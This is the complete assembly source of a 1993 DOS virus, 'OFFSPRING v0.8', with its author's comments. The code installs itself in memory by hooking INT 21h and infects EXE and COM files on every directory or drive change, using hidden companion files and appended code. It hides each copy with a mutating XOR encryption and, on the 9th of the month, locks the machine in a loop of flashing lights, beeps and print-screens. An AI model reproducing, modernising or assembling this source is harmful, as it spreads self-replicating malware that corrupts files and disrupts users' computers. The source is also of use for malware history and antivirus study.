;-------------------------------------------------------------------------
; ************************************************
;     OFFSPRING v0.8 - BY VIROGEN - 04-26-93
; ************************************************
;
;  - Compatible with : TASM /m2
;
;  TYPE : Parastic & Spawning Resident Encrypting (PSRhA)
;
;
;  VERSION : BETA 0.8
;
;  INFECTION METHOD :  Everytime DOS function 3Bh (change dir) or function
;                      0Eh (change drive) is called the virus will infect
;                      up to 5 files in the current directory (the one
;                      you're coming out of). It will first infect all
;                      EXE files by creating a corresponding COM. Once
;                      all EXE files have been infected, it then infects
;                      COM files. All COM files created by a spawning
;                      infection will have the read-only and hidden
;                      attribute.
;
;
;  THE ENCRYPION OF THIS VIRUS :
;                      Ok, this virus's encryption method is a simple
;                      XOR. The encryption operands are changed directly.
;                      Also, the operands are switched around, and the
;                      encryption routine switches from using di to si.
;                      Not anything overly amazing, but it works.
;
;
	    title   offspring_1
	    .286
cseg	    segment
	    assume  cs: cseg, ds: cseg, ss: cseg, es: cseg

signal	    equ	    7dh			    ; Installation check
reply	    equ	    0fch		    ; reply to check
f_name	    equ	    1eh			    ; Offset of file name in FF/FN buffer
f_sizel	    equ	    1ch			    ; File size - low - loc in mem
f_sizeh	    equ	    1ah			    ; File size - high - loc in mem
f_date	    equ	    18h			    ; File date - loc in mem
f_time	    equ	    16h			    ; File time - loc in mem
max_inf	    equ	    05			    ; Maximum files to infect per run
max_rotation equ    9			    ; number of bytes in switch byte table
parastic    equ	    01			    ; Parastic infection
spawn	    equ	    00			    ; Spawning infection

	    org	    100h		    ; Leave room for PSP

;------------------------------------------------------------------
; Start of viral code
;------------------------------------------------------------------

start:

	    db	    0bdh		    ; MOV BP,xxxx - Load delta offset
	    set_bp:
	    dw	    0000

	    skip_dec:
	    jmp	    main		    ; Skip decryption, changes into NOP on
	    	    			    ; replicated copies.
	    di_op   db 0bfh
	    mov_di  dw offset enc_data+2    ; Point to byte after encryption num
	    	    			    ;
;-------------------------
; Encryption/Decryption

encrypt:
cx_m	    db	    90h,0b9h		    ; MOV CX
b_wr	    dw	    (offset vend-offset enc_data)/2
xor_loop:
	    xor_op: xor word ptr [di],0666h ; Xor each word - number changes accordingly
	    sw_byte3: 			    ; INC xx changes position in these bytes
	    inc	    di
	    nop
	    nop
	    sw_byte4:
	    inc	    di
	    nop
	    nop
	    loop    xor_loop		    ; loop while cx != 0

	    ret_byte db 90h		    ; Changes to RET (0C3h) - then back to NOP

enc_data:   	    			    ; Start of encrypted data

;-------------------------------
;  Non-Resident portion of virus
;-------------------------------
main	    proc

	    mov	    word ptr skip_dec[bp],9090h ; NOP the jump past decryption

	    mov	    ax,ds: 002ch	    ; Get environment address
	    mov	    par_blk[bp],ax	    ; Save in parameter block for exec

	    mov	    par1[bp],cs		    ; Save segments for EXEC
	    mov	    par2[bp],cs
	    mov	    par_seg[bp],cs

	    mov	    ah,2ah		    ; Get date
	    int	    21h

	    cmp	    dl,9		    ; 9th?
	    jne	    no_display

	    mov	    ah,09		    ; display virus name
	    lea	    dx,vname[bp]
	    int	    21h

	    xor	    ax,ax		    ; seg 0
	    mov	    es,ax
	    mov	    dx,1010101010101010b    ; lights
	    chg_lights: 		    ; Infinite loop to change keyboard
	    mov	    word ptr es: [416h],dx  ; 0040:0016h = keyb flags
	    ror	    dx,1		    ; rotate bits
	    mov	    cx,0101h		    ; scan code/ascii
	    mov	    ah,05h		    ; push a beep onto keyb buf
	    int	    16h
	    mov	    ah,10h		    ; Read key back so we don't fill
	    int	    16h			    ; up the keyboard buffer
	    int	    5h			    ; Print-Screen
	    mov	    ax,0a07h		    ; Write BEEP to screen
	    xor	    bh,bh
	    mov	    cx,1
	    int	    10h
	    mov	    ah,86h		    ; Delay
	    mov	    cx,0002h
	    int	    15h

	    jmp	    chg_lights

	    no_display:

	    call    install		    ; check if installed, if not install

	    cmp	    byte ptr vtype[bp],parastic
	    je	    com_return

	    mov	    bx,(offset vend+50)	    ; Calculate memory needed
	    mov	    cl,4		    ; divide by 16
	    shr	    bx,cl
	    inc	    bx
	    mov	    ah,4ah
	    int	    21h			    ; Release un-needed memory

	    lea	    dx,file_dir-1[bp]	    ; Execute the original EXE
	    lea	    bx,par_blk[bp]
	    mov	    ax,4b00h
	    int	    21h

	    mov	    ah,4ch		    ; Exit
	    int	    21h

	    com_return:

	    mov	    si,bp
	    mov	    cx,4		    ; Restore original first
	    add	    si,offset org_bytes	    ; five bytes of COM file
	    mov	    di,0100h
	    cld
	    rep	    movsb

	    mov	    ax,0100h		    ; Simulate CALL return to 0100h
	    push    ax
	    ret

main	    endp

;--------------------------------------
; INSTALL - Install the virus
;--------------------------------------

install	    proc

	    mov	    ah,signal
	    int	    21h
	    cmp	    ah,reply
	    je	    no_install

	    mov	    ax,cs
	    dec	    ax
	    mov	    ds,ax
	    cmp	    byte ptr ds: [0],'Z'    ;Is this the last MCB in
	    	    			    ;the chain?
	    jne	    no_install


	    mov	    ax,ds: [3]		    ;Block size in MCB
	    sub	    ax,190		    ;Shrink Block Size-quick estimate
	    mov	    ds: [3],ax

	    mov	    bx,ax
	    mov	    ax,es
	    add	    ax,bx
	    mov	    es,ax		    ;Find high memory seg

	    mov	    si,bp
	    add	    si,0100h
	    mov	    cx,(offset vend - offset start)
	    mov	    ax,ds
	    inc	    ax
	    mov	    ds,ax
	    mov	    di,100h		    ; New location in high memory
	    cld
	    rep	    movsb		    ; Copy virus to high memory

	    push    es
	    pop	    ds
	    xor	    ax,ax
	    mov	    es,ax		    ; null es
	    mov	    ax,es: [21h*4+2]
	    mov	    bx,es: [21h*4]
	    mov	    ds: old21_seg,ax	    ; Store segment
	    mov	    ds: old21_ofs,bx	    ; Store offset

	    cli

	    mov	    es: [21h*4+2],ds	    ; Save seg
	    lea	    ax, new21
	    mov	    es: [21h*4],ax	    ; off

	    sti

	    no_install:
	    push    cs			    ; Restore regs
	    pop	    ds
	    push    cs
	    pop	    es

	    ret
install	    endp

;--------------------------------------------------------------------
; INT 21h
;---------------------------------------------------------------------

new21	    proc    			    ; New INT 21H handler

	    cmp	    ah, signal		    ; signaling us?
	    jne	    no
	    mov	    ah,reply		    ; yep, give our offspring what he wants
	    jmp	    end_21
	    no:
	    cmp	    ah, 3bh		    ; set dir func?
	    je	    run_res
	    cmp	    ah,0eh		    ; set disk func?
	    je	    run_res

	    jmp	    end_21

	    run_res:
	    pushf
	    push    ax			    ; Push regs
	    push    bx
	    push    cx
	    push    dx
	    push    di
	    push    si
	    push    bp
	    push    ds
	    push    es
	    push    sp
	    push    ss

	    push    cs
	    pop	    ds

	    xor	    ax,ax		    ; nullify ES
	    mov	    es,ax

	    cmp	    byte ptr add_mem,1	    ; Restore system conventional mem size?
	    je	    rel_mem		    ;
	    cmp	    ah,48h		    ; alloc. mem block? If so we subtract 3k from
	    je	    set_mem		    ; total system memory.

	    jmp	    no_mem_func

	    set_mem:
	    sub	    word ptr es: [413h],3   ; Subtract 3k from total sys mem
	    inc	    byte ptr add_mem	    ; make sure we know to add this back
	    jmp	    no_mem_func
	    rel_mem:
	    add	    word ptr es: [413h],3   ; Add 3k to total sys mem
	    dec	    byte ptr add_mem


	    no_mem_func:
	    mov	    ah,2fh
	    int	    21h			    ; Get the DTA

	    mov	    ax,es
	    mov	    word ptr old_dta,bx
	    mov	    word ptr old_dta+2,ax
	    push    cs
	    pop	    es

	    call    resident		    ; Call infection kernal

	    mov	    dx,word ptr old_dta
	    mov	    ax,word ptr old_dta+2
	    mov	    ds,ax
	    mov	    ah,1ah
	    int	    21h			    ; Restore the DTA

	    pop	    ss			    ; Pop regs
	    pop	    sp
	    pop	    es
	    pop	    ds
	    pop	    bp
	    pop	    si
	    pop	    di
	    pop	    dx
	    pop	    cx
	    pop	    bx
	    pop	    ax
	    popf
	    end_21  :
	    db	    0eah		    ; jump to original int 21h
old21_ofs   dw	    0			    ; Offset of old INT 21H
old21_seg   dw	    0			    ; Seg of old INT 21h
new21	    endp    			    ; End of handler

;------------------------
; Resident - This is called from the INT 21h handler
;-----------------------------
resident    proc

	    mov	    byte ptr vtype,spawn
	    mov	    word ptr set_bp,0000    ; BP=0000 on load
	    mov	    byte ptr inf_count,0    ; null infection count
	    mov	    fname_off, offset fname1 ; Set search for *.EXE
	    mov	    word ptr mov_di,offset enc_data+2

	    find_first:
	    mov	    word ptr vend,0	    ; Clear ff/fn buffer
	    lea	    si, vend
	    lea	    di, vend+2
	    mov	    cx, 22
	    cld
	    rep	    movsw

	    	    			    ; Set DTA address - This is for the Findfirst/Findnext INT 21H functions
	    mov	    ah, 1ah
	    lea	    dx, vend
	    int	    21h

	    mov	    ah, 4eh		    ; Findfirst
	    mov	    cx, 0		    ; Set normal file attribute search
	    mov	    dx, fname_off
	    int	    21h

	    jnc	    next_loop		    ; if still finding files then loop
	    jmp	    end_prog

	    next_loop :
	    cmp	    byte ptr vtype, parastic ; parastic infection?
	    je	    start_inf		    ; yes, skip all this

	    mov	    ah,47h
	    xor	    dl,dl
	    lea	    si,file_dir
	    int	    21h

	    cmp	    word ptr vend[f_sizel],0 ; Make sure file isn't 64k+
	    je	    ok_find		    ; for spawning infections
	    jmp	    find_file

	    ok_find:
	    xor	    bx,bx
	    lm3	    :			    ; find end of directory name
	    inc	    bx
	    cmp	    file_dir[bx],0
	    jne	    lm3

	    mov	    file_dir[bx],'\'	    ; append backslash to path
	    inc	    bx

	    mov	    cx,13		    ; append filename to path
	    lea	    si,vend[f_name]
	    lea	    di,file_dir[bx]
	    cld
	    rep	    movsb

	    xor	    bx,bx
	    mov	    bx,1eh

	    loop_me: 			    ; search for filename ext.
	    inc	    bx
	    cmp	    byte ptr vend[bx], '.'
	    jne	    loop_me

	    inc	    bx			    ; change it to COM
	    mov	    word ptr vend [bx],'OC'
	    mov	    byte ptr vend [bx+2],'M'


	    start_inf:

	    cmp	    byte ptr vtype, parastic ; parastic infection?
	    je	    parastic_inf	    ; yes.. so jump

;--------------------------------------
; Spawning infection


	    lea	    dx, vend[f_name]
	    mov	    ah, 3ch		    ; Create file
	    mov	    cx, 02h		    ; READ-ONLY
	    or	    cx, 01h		    ; Hidden
	    int	    21h			    ; Call INT 21H
	    jnc	    contin		    ; If Error-probably already infected
	    jmp	    no_infect
	    contin:

	    inc	    inf_count
	    mov	    bx,ax

	    jmp	    encrypt_ops
;----------------------------------------
; Parastic infection

	    parastic_inf :

	    cmp	    word ptr vend+f_sizeh,400h
	    jge	    cont_inf2
	    jmp	    no_infect

	    cont_inf2:

	    lea	    si,vend+f_name	    ; Is Command.COM?
	    lea	    di,com_name
	    mov	    cx,11
	    cld
	    repe    cmpsb

	    jne	    cont_inf0		    ; Yes, don't infect
	    jmp	    no_infect

	    cont_inf0:

	    mov	    ax,3d02h		    ; Open file for reading & writing
	    lea	    dx,vend+f_name	    ; Filename in FF/FN buffer
	    int	    21h

	    jnc	    cont_inf1		    ; error, skip infection
	    jmp	    no_infect

	    cont_inf1:


	    mov	    bx,ax

	    mov	    ah,3fh		    ; Read first bytes of file
	    mov	    cx,04
	    lea	    dx,org_bytes
	    int	    21h

	    cmp	    word ptr org_bytes,0e990h
	    jne	    cont_inf
	    mov	    ah,3eh
	    int	    21h
	    jmp	    no_infect

cont_inf:
	    inc	    inf_count
	    mov	    ax,4202h		    ; Set pointer to end of file, so we
	    xor	    cx,cx		    ; can find the file size
	    xor	    dx,dx
	    int	    21h

	    mov	    word ptr set_bp,ax	    ; Change the MOV BP inst.
	    add	    ax, offset enc_data+2
	    mov	    word ptr mov_di,ax	    ; chg mov di,xxxx

	    mov	    ax,4200h
	    xor	    cx,cx
	    xor	    dx,dx
	    int	    21h

	    mov	    ax,word ptr vend+f_sizeh
	    sub	    ax,4
	    mov	    word ptr new_jmp+1,ax


	    mov	    ah,40h
	    mov	    cx,4
	    lea	    dx,new_code
	    int	    21h

	    mov	    ax,4202h
	    xor	    cx,cx
	    xor	    dx,dx
	    int	    21h


encrypt_ops:

;-----------------------------
; Change encryptions ops

	    push    bx

	    cmp	    pad_bytes,50
	    je	    reset_pad
	    inc	    word ptr pad_bytes	    ; Increase file size
	    inc	    word ptr b_wr
	    jmp	    pad_ok
	    reset_pad:
	    mov	    ax,pad_bytes
	    sub	    word ptr b_wr,ax
	    xor	    ax,ax
	    mov	    pad_bytes,ax

	    pad_ok:

	    cmp	    inc_op,47h		    ; change ops from DI to SI
	    jne	    set2
	    dec	    inc_op
	    dec	    byte ptr xor_op+1
	    dec	    di_op
	    dec	    byte ptr enc_addr
	    dec	    byte ptr enc_add+1
	    jmp	    chg_three
	    set2:
	    inc	    inc_op
	    inc	    byte ptr xor_op+1
	    inc	    di_op
	    inc	    byte ptr enc_addr
	    inc	    byte ptr enc_add+1

chg_three:
	    mov	    ah,inc_op
	    xor	    cx,cx
	    lea	    di,sw_byte3
chg_four:
	    xor	    bx,bx		    ; Switch INC xx's location
	    cmp	    word ptr [di],9090h
	    je	    mov_pos
	    inc	    bx
	    inc	    bx
	    cmp	    byte ptr [di+1],90h	    ;  is second byte not 90h
	    je	    mov_pos
	    dec	    bx
mov_pos:    mov	    word ptr [di],9090h	    ;  set all three bytes (of 3rd)
	    mov	    byte ptr [di+2],90h	    ;  to NOP
	    mov	    byte ptr [di+bx],ah	    ;  place inc xx in other byte

	    lea	    di,sw_byte4
	    inc	    cx
	    cmp	    cx,1
	    je	    chg_four
;-----------------------
; Get random XOR number, save it, copy virus, encrypt code

d2:
	    mov	    ah,2ch		    ;
	    int	    21h			    ; Get random number from clock - millisecs

	    mov	    word ptr xor_op+2,dx    ; save encryption #


	    mov	    si,0100h
	    lea	    di,vend+50		    ; destination
	    mov	    cx,offset vend-100h	    ; bytes to move
	    cld
	    rep	    movsb		    ; copy virus outside of code

	    enc_addr:
	    mov	    di,offset vend
	    enc_add:
	    add	    di,offset enc_data-100h+52 ; offset of new copy of virus

go_enc:
	    mov	    byte ptr ret_byte,0c3h
	    call    encrypt		    ; encrypt new copy of virus
	    mov	    byte ptr ret_byte,90h

;----------------------------------------
; Write and close new infected file

	    pop	    bx
	    mov	    cx, offset vend-100h    ; # of bytes to write
	    add	    cx, pad_bytes
	    lea	    dx, vend+50		    ; Offset of buffer
	    mov	    ah, 40h		    ; -- our program in memory
	    int	    21h			    ; Call INT 21H function 40h

	    mov	    ax,5701h		    ; Restore data/time
	    mov	    cx,word ptr vend[f_time]
	    mov	    dx,word ptr vend[f_date]
	    int	    21h


close:
	    mov	    ah, 3eh
	    int	    21h


no_infect:

; Find next file
	    find_file :

	    cmp	    inf_count, max_inf
	    je	    end_prog
	    mov	    ah,4fh
	    int	    21h
	    jc	    end_prog
	    jmp	    next_loop


	    end_prog:
	    exit    :
	    cmp	    inf_count,0		    ; Start parastic infection on next run
	    jne	    find_done
	    cmp	    byte ptr vtype, parastic ; Parastic infection done?
	    je	    find_done
	    mov	    fname_off, offset fname2 ; Point to new filespec
	    mov	    byte ptr vtype, parastic ; virus type = parastic
	    jmp	    find_first


	    find_done:
	    mov	    byte ptr vtype,spawn
	    mov	    fname_off, offset fname1
	    ret
resident    endp

vtype	    db	    spawn		    ; Infection type
rot_num	    dw	    0000		    ; Used when replacing bytes with OP_SET
inf_count   db	    0			    ; How many files we have infected this run
com_name    db	    'COMMAND.COM'	    ; obvious
new_code    db	    90h
new_jmp	    db	    0e9h,00,00		    ; New Jump
org_bytes   db	    5 dup(0)		    ; original first five bytes of parastic inf.
pad_bytes   dw	    0			    ; Increase in viru size
add_mem	    db	    0			    ; Add memory back?
old_dta	    dd	    0			    ; Old DTA Segment:Address
inc_op	    db	    47h			    ; INC DI (47h) or INC SI (46h)

copyr	    db	    '(c)1993 negoriV'	    ; my copyright
vname	    db	    0ah,0dh,'OFFSPRING V0.8','$'

fname1	    db	    '*.EXE',0		    ; Filespec
fname2	    db	    '*.COM',0		    ; Filespec
fname_off   dw	    fname1		    ; Offset of Filespec to use
times_inc   db	    0			    ; # of times encryption call incremented
sl	    db	    '\'			    ; Backslash for directory name
file_dir    db	    64 dup(0)		    ; directory of file we infected
file_name   db	    13 dup(0)		    ; filename of file we infected

par_blk	    dw	    0			    ; command line count byte   -psp
par_cmd	    dw	    0080h		    ; Point to the command line -psp
par_seg	    dw	    0			    ; seg
	    dw	    05ch		    ; Use default FCB's in psp to save space
par1	    dw	    0			    ;        
	    dw	    06ch		    ; FCB #2
par2	    dw	    0			    ;
vend:	    	    			    ; End of virus

cseg	    ends
	    end	    start
